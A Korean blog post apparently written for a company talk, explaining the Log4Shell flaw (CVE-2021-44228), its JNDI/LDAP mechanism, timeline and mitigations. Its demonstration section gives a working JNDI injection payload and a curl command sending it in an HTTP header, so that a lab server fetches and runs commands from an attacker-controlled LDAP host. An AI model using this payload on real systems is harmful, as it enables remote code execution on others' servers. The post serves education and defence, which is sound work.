# log4 보안 취약점 CVE-2021-44228 공격 원리와 시연 및 대응 방안

## Intro

최근 갑자기 사내 연말 행사에서 15분간의 짧은 발표를 맡게 되었습니다. 

좀 더 미리 알았더라면 준비를 충분히 했을 텐데.. 갑자기 공지가 되어 굉장히 당황스러웠지만 어쨌든 아쉬운대로 부랴부랴 준비를 시작했습니다.

회사의 사업 내용이 IT계열이다 보니, 개발에 관련되었지만 동시에 사내에서 개발직종에 속하지 않은 분들에게도 흥미를 끌 만한 주제를 여러가지 후보군에 두고 메모앱에 기록해가며 며칠간 후보를 좁히고 있었습니다. 평소 블로그를 작성하다 보니 여유만 되면 의견을 나누고 싶은 주제가 몇가지 있었습니다.

그러던 중 출근길 버스에서 평소처럼 책을 읽다가, 보안에 관련된 항목이 나오자 한창 떠들썩하게 만들고 있는 log4 보안 이슈에 대해 고민하게 되었습니다. 그러다 문득 발표 주제로 참 괜찮겠다는 생각이 들었고 그렇게 한번 거기 꽂혀버리니 책의 활자도 눈에 전혀 들어오지 않고 근 일주일 해당 이슈에만 정신이 쏠렸습니다.

퇴근하고 오자마자 cloud와 docker를 활용해 여러가지 취약점들을 테스트 하고, 관련 문서들을 둘러보다 새벽 늦게 잠들다보니 입사후 4개월만에 처음으로 택시를 타고 출근하는 경험마저 해 보았습니다.

>  toss 카드로 교통비를 결제해서 하루 300원씩 절약하고 있었는데 두 달치 할인받은걸 하루만에 다 까먹었습니다.

그래도 그렇게 일주일정도 몰입한 덕에 스스로 어느정도 내용이 정돈이 되어서, 발표 자료를 준비하기 전에 글로 먼저 정리 해보려 합니다.

## Log4j 보안 취약점 사태

### CVE-2021-44228

2021년의 마무리를 뜨겁게 달군 Log4j 보안 취약점 사태가 `겉으로 보기에는` 수습되어 가는 분위기 입니다.

Log4J는 따로 설명이 불필요할 정도로 자바 개발자라면 누구나 알게 모르게 항상 사용하고 있는 로깅 라이브러리 입니다.

특히 최근 뉴스에도 심심치않게 등장하다 보니 IT에 조금만 관심이 있는 사람들은 한번쯤 다들 들어보았을 텐데요. 

컴퓨터와 인터넷 역사를 모두 통틀어 사상 최악의 보안 결함이라고 불리고 있는 이 취약점이 정말 그정도로 심각한 문제인지, 그리고 무엇 때문에 이런일이 일어났는지 그 원인에 대해 함께 알아보겠습니다.

### CVSS

![cvss](https://raw.githubusercontent.com/Shane-Park/mdblog/main/news/log4shell.assets/CVSS-Score-Metrics-Blog.png)

> https://www.balbix.com/insights/understanding-cvss-scores/

CVSS 는 공격 벡터, 공격의 복잡성, 필요한 권한 등 취약점의 중요 특성들에 따라 수치화 된 점수로 심각성을 표기하는 서비스를 제공합니다. 

![image-20211225120443693](https://raw.githubusercontent.com/Shane-Park/mdblog/main/news/log4shell.assets/image-20211225120443693.png)

> https://nvd.nist.gov/vuln/detail/CVE-2021-44228

이번 취약점인 CVE-2021-44228는 CVSS(Common Vulnerability Scoring System) 10점을 기록하고 있습니다.

CVSS 10점은 전체 보고되는 취약점 가운데 상위 0.2%에 속할 정도로 드문 취약점이며, 가장 높은 단계입니다. 그 전례 없는 피해 규모를 알 수 없을 정도의 심각성 때문인지 제로데이 공격코드는 즉각 공개가 되었습니다.

### 제로데이 취약점

`Zero-Day`는 취약점이 발견 된 혹은 공개 된 그 날을 말합니다. 

해당 시점에 공격자들은 이미 알고 해당 취약점을 이용하고 있지만 개발자에서는 공격 시점에 그걸 해결 할 시간이 만 하루도 없기 때문에 제로데이 공격이라고 불립니다. 해당 취약점에 대한 대책이 아직 없기 때문에 어떤 컴퓨터든 공격에 무방비로 노출 될 수 밖에 없습니다.

재밌게도 관찰되는 대부분의 취약점은 제로데이지만, 취약점의 42%는 대응 패치가 출시 된 이후에야 악용된다고 합니다. 공표되는 순간부터 공격자와 패치 배포를 시도하는 그룹간의 치열한 전쟁이 일어납니다.

> 실제 보안담당자들의 말을 인용하자면, 트위터등에 공격 코드가 공개 되고 나면 불과 몇시간 내에 공공기관이나 금융권에 제일 먼저 해당 공격들이 즉각 감지된다고 합니다. 또한 해당 취약점들은 대응 후 몇주, 몇달, 몇년이 지나도 여전히 악용됩니다.

## 공격 원리

![img](https://raw.githubusercontent.com/Shane-Park/mdblog/main/news/log4shell.assets/research-Log4Shell-2.jpg)

사태의 심각성을 생각하면 허무 할 정도로 그 취약점의 원리가 간단합니다. JDNI와 LDAP을 활용합니다.

### JNDI

> Java Naming and Directory Interface

![img](https://raw.githubusercontent.com/Shane-Park/mdblog/main/news/log4shell.assets/jndiarch-20211225122832831.jpg)

> https://docs.oracle.com/javase/jndi/tutorial/getStarted/overview/index.html

JNDI는 자바로 작성된 소프트웨어 클라이언트들에 name(이름)을 통해 자바 객체 형태의 리소스를 discover(검색)하고 look up(조회)하는 기능을 제공하는 Application Program Interface(API) 입니다. 선택된 구현에 따라 달라지지만 JNDI를 통해 조회된 정보들은 서버나 일반 파일 혹은 데이터베이스에 제공 될수 있습니다. 일반적으로 자바 어플리케이션을 외부 디릭터리 서비스에 연결하는데 됩니다.

JNDI를 이용하기 위해서는 JNDI 객체들과 함께 하나 이상의 서비스 프로바이더가 필요하며 본 취약점에서는 그 역할을 LDAP이 맡았습니다.

### LDAP

> Lightweight Directory Access Protocol

![OpenLDAP](https://raw.githubusercontent.com/Shane-Park/mdblog/main/news/log4shell.assets/intro_dctree.gif)

> https://www.openldap.org/doc/admin21/intro.html
>
> LDAP directory tree

경량 디렉터리 액세스 프로토콜은 TCP/IP 위에서 디렉터리 서비스를 조회하고 수정하는 응용 프로토콜 입니다. 

서울에서 김서방을 빨리 찾을 수 없는 것 처럼, RDBMS의 최대 단점 중 하나는 처리 속도인데요, 종종 그 문제를 보완하기 위해 사용됩니다.

LDAP은 원래 전화번호부를 기본으로 만들어 졌습니다. 그 성격은 자주 업데이트 되지 않으면서 검색 요청이 많이 필요한 부분에 적합 한 것입니다. 

특히, 인증을 위한 다른 서비스에 자주 사용되는데, 스프링 시큐리티에서는 자바 기반의 내장 OpenLDAP 서버를 활용 할 수 있습니다.

### log4j

Log4j 에서는 편리하게 사용하기 위해 ${prefix:name} 형식으로 java 객체를 볼 수 있게 하는 문법이 존재합니다. 예를 들어 ${java:version}을 입력하면 자바 버전을 볼 수 있습니다. 이런 문법이 로그가 기록 될 때도 사용이 가능했고, 결국 공격자가 로그에 기록되는 부분을 찾아 `${jndi:ldap://attacker_URL}` 와 같은 값을 추가하기만 하면 간단하게 취약점을 이용 할 수 있습니다.

기본적인 공격 흐름은 아래와 같습니다.

![](https://raw.githubusercontent.com/Shane-Park/mdblog/main/news/log4shell.assets/mxw_1536,s_jp2,s_videoimg,f_auto.png)

> https://jfrog.com/blog/log4shell-0-day-vulnerability-all-you-need-to-know/

### 타임라인

- 2013년 7월 17일

> ![](https://raw.githubusercontent.com/Shane-Park/mdblog/main/news/log4shell.assets/image-20211225181425671.png)
>
> > https://issues.apache.org/jira/browse/LOG4J2-313
>
> 해당 이슈로부터 추가된 JNDI Lookup 플러그인에서 문제가 시작되었습니다. 그 이후 이 문제는 무려 8년동안이나 방치되었습니다.

- 2021년 11월 24일

> 알리바바 클라우드 보안팀의 Chen Zhaojun가 해당 문제를 발견해 Apache 재단에 보고 했습니다.

- 2021년 11월 30일

> 해당 문제를 수정하는 Pull Request가 올라왔습니다.
>
> ![image-20211225182731979](https://raw.githubusercontent.com/Shane-Park/mdblog/main/news/log4shell.assets/image-20211225182731979.png)
>
> > https://github.com/apache/logging-log4j2/pull/608

- 2021년 12월 10일

> Github에 취약점이 게재되어 영향받는 저장소들에 경고 알림이 전달되었습니다.
>
> ![image-20211225184221518](https://raw.githubusercontent.com/Shane-Park/mdblog/main/news/log4shell.assets/image-20211225184221518.png)
>
> ![image-20211225184305839](https://raw.githubusercontent.com/Shane-Park/mdblog/main/news/log4shell.assets/image-20211225184305839.png)
>
> Github의 dependabot이 알아서 취약점을 해결하는 PR까지 만들어 주기 때문에 merge 시키고 서버에 반영해주기만 하면 됩니다.

- 2021년 12월 11일

> KISA에서는 보안 공지를 통해 각 Log4j 버전 별로 해결할 수 있는 방법을 게시하였습니다.
>
> ![image-20211225184547546](https://raw.githubusercontent.com/Shane-Park/mdblog/main/news/log4shell.assets/image-20211225184547546.png)
>
> > https://www.krcert.or.kr/data/secNoticeView.do?bulletin_writing_sequence=36389

### 왜 문제가 되는가

대응할 시간이 충분하지 않은 상태에서 주말에 공격 코드가 공개되었습니다. 심지어 공개된 공격 코드는 단 한 줄로 이루어 졌습니다.

공격 패턴들이 제대로 반영되지 않은 상태에서 공격 로그도 겨우 한줄만으로 백도어가 설치되는 개념이다 보니 일단 시스템에 백도어 공격이 들어오고, 공격자가 이미 백도어를 통해 공격 서버와 연결을 시켰다면 그때부터는 정말 찾기가 어렵습니다. 어디까지 침투되었는지 확인하기도 굉장히 어렵습니다. 확인해야 할 로그들이 너무 많습니다. 아직까지도 피해 규모가 전혀 파악이 안되는 이유 입니다.

![Researchers trigger new exploit by renaming an iPhone and a Tesla - The  Verge](https://raw.githubusercontent.com/Shane-Park/mdblog/main/news/log4shell.assets/log4shell1.jpeg)

>  애플 아이폰의 Name을 공격 코드로 변경했을 때는 애플의 백엔드 서버에서 공격자의 URL로 요청을 보냈으며

![Bharanisai on Twitter: &quot;Tesla pwned via Log4j RCE #log4j #Shell #security  #appsec #vulnerability #zeroday https://t.co/Klh5O0l74g&quot; / Twitter](https://raw.githubusercontent.com/Shane-Park/mdblog/main/news/log4shell.assets/FGY2ioCVgAY0Fr7.jpeg)

> 테슬라 차량도 마찬가지로 공격에 노출되어 있었다고 합니다.

그 외에도 이름을 대면 알법만 모든 대기업들 또한 이 취약점으로 부터 자유롭지 못했습니다.

## 문제가 되는 경우

### 조건

공격 시연을 위해 여러가지 시도를 해 보며 확인을 해 보니 제가 시도한 공격 방법으로는 아래의 세가지 조건이 일치되어야 했습니다.

- 사용하는 log4j core의 버전이 2.0에서 2.14.1 사이
- logger.info(), logger.debug(), logger.error 등등.. 로그를 기록하는 부분을 공격자가 알고 있어야 함
- JRE / JDK 버전이 아래의 버전보다 오래되어야 함
  - 6u221
  - 7u201
  - 8u191
  - 11.0.1

> 이 부분때문에 처음 시연을 준비할때 꽤나 애를 먹었는데요, 비교적 최신의 JVM 에서는 `com.sun.jndi.ldap.object.trustURLCodebase` 의 기본값이 false 로 되어 있기 때문입니다. 이 덕분에 JNDI가 임의의 URL 코드베이스로부터 클래스를 로드하지 못합니다.
>
> <u>하지만, 최신의 자바 버전에 의존해서 해당 취약점을 대응하는건 분명 위험하다는게 이미 여러 가지 테스트를 통해 입증되었습니다.</u>

### 저는 log4 안쓰고 로그 기록 안하니까 안전해요!

실제로 최근 Github에 올라오는 커밋들을 확인 하니, pom.xml 에서 log4 삭제 하고 충분한 대응을 했다고 여기는 분들이 많이 있는 듯 했습니다.

전혀 그렇지 않습니다. 제가 인상깊게 봤던 트윗중 하나를 공유 해 드리겠습니다.

![image-20211225190926037](https://raw.githubusercontent.com/Shane-Park/mdblog/main/news/log4shell.assets/image-20211225190926037.png)

> https://twitter.com/nahsra/status/1471831354350440461

arshan이 모니터 한 자바 어플리케이션중 64%가 log4j2를 포함 하고 있었고 58%가 취약했다고 합니다. 하지만 실제로 log4j2를 사용하고 있는건 37%에 불과했다고 하는데요, log4j2는 우리가 자주 사용하는 라이브러리들이 자주 사용하는 라이브러리라는 것을 반드시 명심해야 합니다.

## 공격 시연

사실상 제가 가장 많은 시간을 투자한 부분이지만 그 파급이 아직까지도 워낙에 크기 때문에 공개적으로 상세하게 소개하기에는 부담이 됩니다.

너무 자세히 소개하지는 않도록 노력 해 보겠습니다.

### 준비사항

- 공격 코드가 준비된 LDAP 서버

- 취약한 어플리케이션을 구동중인 서버

- 공격을 시도할 클라이언트

### 공격 시나리오

![Log4J Vulnerability Exploitation Illustration (CVE-2021-44228 )](https://raw.githubusercontent.com/Shane-Park/mdblog/main/news/log4shell.assets/log4j-vulnerability-exploitation-illustration-cve-2021-44228-.png)

> https://www.prplbx.com/resources/blog/log4j/

### 공격 서버

오라클 클라우드의 우분투 인스턴스에 공격 서버를 실행시켰습니다. LDAP 서버는 1389 포트를, HTTP 서버는 8888 포트를 리스닝 합니다.

![image-20211225210028483](https://raw.githubusercontent.com/Shane-Park/mdblog/main/news/log4shell.assets/image-20211225210028483.png)

### 취약 서버

docker를 통해 가상환경에 구동 했습니다. 로컬에서 취약점을 노출시키기에는 리스크가 크기 때문에 주의해야 합니다.

실제로 집에서 서버를 운영해 보면, 보통 쉽게 생각하는 것보다 훨~~~씬 많은 공격 시도가 매일 매일 감지 됩니다. 이 테스트를 진행하는 잠깐 동안에도 외부 포트를 열어둔 인스턴스에는 엉뚱한 ip로부터의 요청들이 몇몇 감지 되었습니다.

![vulnerable](https://raw.githubusercontent.com/Shane-Park/mdblog/main/news/log4shell.assets/vulnerable.png)

### 공격

이번에 사용할 공격 코드 형식은 아래와 같습니다.

```bash
${jndi:ldap://공격아이피:1389/Basic/Command/Base64/실행할 명령을 Base64로 인코딩한 메시지}
```

이번에 취약 서버에서 실행 할 명령은 `touch /tmp/shane` 입니다.

base64 인코더는 따로 준비 할 필요 없이 Terminal에서 아래의 명령으로 간단하게 이용 할 수 있습니다.

```bash
 echo -n 'touch /tmp/shane' | base64
```

![image-20211225211521249](https://raw.githubusercontent.com/Shane-Park/mdblog/main/news/log4shell.assets/image-20211225211521249.png)

공격 코드가 정해 졌습니다. 즉각 해당코드를 실행 하도록 취약 서버에 요청을 보내 보겠습니다.

```bash
curl 192.168.0.32:9999 -H 'X-Api-Version: ${jndi:ldap://공격ip:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9zaGFuZQ==}'
```

취약서버 톰캣 로그

![vulnerable](https://raw.githubusercontent.com/Shane-Park/mdblog/main/news/log4shell.assets/vulnerable-0434863.png)

> 취약 서버에서는 즉각 해당 공격 URL로 http 요청을 보내고 받은 원격 명령을 실행 합니다.

공격서버 로그

![image-20211225211852523](https://raw.githubusercontent.com/Shane-Park/mdblog/main/news/log4shell.assets/image-20211225211852523.png)

> 공격 서버에서는 touch /tmp/shane 커맨드를 payload에 담아 LDAP 응답을 보냅니다. 
>
> 그러고는 취약 서버에서 해당 파일을 요구하는 http 요청을 다시 공격 서버로 보내고, 그렇게 취약서버로  공격 코드가 전송됩니다.

취약 서버 파일

![file](https://raw.githubusercontent.com/Shane-Park/mdblog/main/news/log4shell.assets/file.png)

취약 서버의 /tmp 폴더를 확인 해 보니 shane 이라는 이름의 파일이 생성 되어 있습니다. 

이렇게 간단한 공격으로 백도어가 설치되는 시나리오를 간단하게 재현 해 보았습니다.

![image-20211225213147467](https://raw.githubusercontent.com/Shane-Park/mdblog/main/news/log4shell.assets/image-20211225213147467.png)

> 파일 삭제도 가능할까요?

![image-20211225213346179](https://raw.githubusercontent.com/Shane-Park/mdblog/main/news/log4shell.assets/image-20211225213346179.png)

![rmrf](https://raw.githubusercontent.com/Shane-Park/mdblog/main/news/log4shell.assets/rmrf.png)

> 당연하게도 파일 삭제 명령도 즉각 실행되었습니다.

이번에는 reboot 명령을 보내보았습니다.

![image-20211225213553294](https://raw.githubusercontent.com/Shane-Park/mdblog/main/news/log4shell.assets/image-20211225213553294.png)

![reboot](https://raw.githubusercontent.com/Shane-Park/mdblog/main/news/log4shell.assets/reboot.png)

> 바로 해당 도커 컨테이너가 종료되었습니다. 

몇가지 공격 시나리오 시연 결과, 사실상 공격자가 취약 서버를 자유 자재로 사용 할 수 있음을 확인 할 수 있었습니다.

## 대응 방안

### log4j scan 활용해 취약점 체크

일단 대응 전에 log4j scan을 활용해 해당 어플리케이션이 취약한지 간단하게 확인 할 수 있습니다.

<u>* 주의사항: log4j 스캔은 교육과 윤리적인 테스팅 목적으로만 사용되어야 합니다. 상호 동의 없이 공격대상을 스캔하는 것은 불법이며 법적인 책임 소재가 발생할 수 있습니다. 절대 아무 URL이나 스캔 하지 마세요. 절대로요.</u> 

1. 저장소 clone

```bash
git clone https://github.com/fullhunt/log4j-scan.git
```

![image-20211225193032777](https://raw.githubusercontent.com/Shane-Park/mdblog/main/news/log4shell.assets/image-20211225193032777.png)

2. 의존성 다운로드

```bash
pip3 install -r requirements.txt
```

![image-20211225193257068](https://raw.githubusercontent.com/Shane-Park/mdblog/main/news/log4shell.assets/image-20211225193257068.png)

3. 실행 

```bash
python3 log4j-scan.py -u "확인할 URL 주소"
```

![image-20211225193442746](https://raw.githubusercontent.com/Shane-Park/mdblog/main/news/log4shell.assets/image-20211225193442746.png)

> 제가 운영중인 www.gaia.best는 대응이 완료되어 스캔 결과 문제가 없다고 나옵니다.

이번에는 취약점이 있는 서버를 대상으로 시도 해 보겠습니다. 저희 집 내부망에 있는 다른 컴퓨터에 9999포트를 바인딩 한 도커 컨테이너를 하나 띄워 취약한 웹 어플리케이션을 띄운 다음 해당 URL을 대상으로 스캔 해 보았습니다. 그 결과는 어떨까요?

```bash
python3 log4j-scan.py -u "http://192.168.0.32:9999"
```

![image-20211225200020587](https://raw.githubusercontent.com/Shane-Park/mdblog/main/news/log4shell.assets/image-20211225200020587.png)

즉각 Target Affected 라고 하며 취약점에 노출되어 있는 상태임을 확인 해 줍니다.

### 대응1: log4j 2.17.0 이후 버전으로 업그레이드

현재 나온 대응 방법중 가장 좋은 방법입니다. KISA에서도 이 방법을 가장 먼저 제안하고 있습니다. 하지만 Java8이 필요 하기 때문에 그 이하의 버전일 경우에는 자바7에서는 Log4j 2.12.3으로 업데이트, java6 에서는 Log4j 2.3.1로 업데이트 해 주어야 합니다.

### 대응2: 신규 업데이트가 불가능 할 경우

1. log4j 2.10.0이상 사용시 아래의 두가지 방법 중 **한가지 이상**의 방법을 사용해 대처합니다.

- Java 실행 인자(Arguments) 에 시스템 속성을 추가해  메시지 lookup을 막습니다. `-Dlog4j2.formatMsgNoLookups=true`

- Java 실행 계정의 환경 변수 혹은 시스템 변수로 `LOG4J_FORMAT_MSG_NO_LOOKUPS=true`를 설정합니다.  `/etc/environment` 파일에 해당 내용을 추가 해 주면 됩니다.

2. log4j 2.7.0 이상 사용시에는 log4.xml 등의 설정에 PatternLayout 속성에 있는 %m 부분을 `%m{nolookups}`로 교체합니다.
3. log4의 버전이 그 이하일 경우에는 대처하기가 좀 더 까다롭습니다. 아래의 명령어로 log4j-core 에서 JndiLookUp에 관련된 모든 파일을 재귀적으로 제거 해 줍니다. 하지만  zip 커맨드가 닿지 못하는 위치에 JndiLookup 클래스가 내장되었을 경우에는 대응이 불가능 하기 때문에 최후의 수단으로만 사용 되며 권장되지 않습니다.

```bash
find ./ -type f -name "log4j-core-*.jar" -exec zip -q -d "{}" org/apache/logging/log4j/core/lookup/JndiLookup.class \;

```

## 정리

이상으로 작금의 Log4j 보안 취약점 사태에 대해 자세히 알아 보았습니다.

사실 Github이 처음으로 경고 해 줄 때만 해도 평소에 주기적으로 알려주던 평범한 취약점 중 하나겠지 라고 생각하다가 10점이라는 스코어에 놀라 즉각 반영을 했었는데요. 그럼에도 자세히 알아보기 전까지는 이정도로 공격이 간단하며 파급력이 큰 문제일 거라고는 생각 하지 못했습니다.

보안에 대해서는 아무리 강조에도 지나침이 없다고들 합니다. 아무리 수많은 항목에서 100점 짜리 훌륭한 보안을 지닌다고 하더라고 단 한 고리라도 0점이면 전체적인 보안 점수는 0점 입니다. 쇠사슬의 전체 강도는 가장 강한 부분이 아닌 **가장 약한** 부분에 따라 결정됩니다.

나는 아니겠지, 이정도는 괜찮겠지 하다가 크게 후회하는 일이 생기지 않도록 항상 신경을 써야 겠습니다.

## 참고자료

https://jfrog.com/blog/log4shell-0-day-vulnerability-all-you-need-to-know/

https://www.prplbx.com/resources/blog/log4j/

https://www.youtube.com/watch?v=FfgG40wmqwM
